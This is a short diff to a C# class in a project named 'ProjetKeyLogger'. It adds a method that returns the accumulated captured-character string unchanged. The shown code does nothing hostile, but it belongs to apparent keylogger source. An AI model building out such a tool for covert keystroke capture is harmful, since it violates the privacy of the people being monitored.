@@ -74,5 +74,15 @@ namespace ProjetKeyLogger
             contenu += caractere;
         }
 
+
+        public string traitementContenue()
+        {
+            string contenu_claire = this.contenu;
+
+
+
+            return contenu_claire;
+        }
+
     }
 }
